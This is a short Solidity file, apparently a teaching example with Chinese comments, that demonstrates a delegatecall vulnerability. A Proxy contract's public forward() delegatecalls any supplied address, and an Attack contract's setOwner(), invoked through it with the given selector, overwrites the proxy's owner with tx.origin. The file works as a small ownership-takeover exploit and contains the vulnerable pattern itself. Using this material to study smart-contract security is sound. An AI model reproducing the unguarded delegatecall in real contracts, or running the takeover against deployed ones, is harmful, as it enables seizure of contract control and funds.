pragma solidity ^0.8.1;

contract Proxy {
    address public owner;

    constructor(){
        owner = msg.sender;
    }

    // _data: 0x40caae06
    // callee填Attack合约的地址
    function forward(address callee, bytes memory _data) public {
        // delegatecall 是一种特殊的函数调用，它会在当前合约的上下文中执行代码，
        // 这意味着它使用的是当前合约的存储，而不是被调用合约的存储
        (bool success, ) = callee.delegatecall(_data);
        require(success, "tx failed");
    }
}

contract Attack {
    address public owner;
    function setOwner() public {
        owner = tx.origin;
    }
}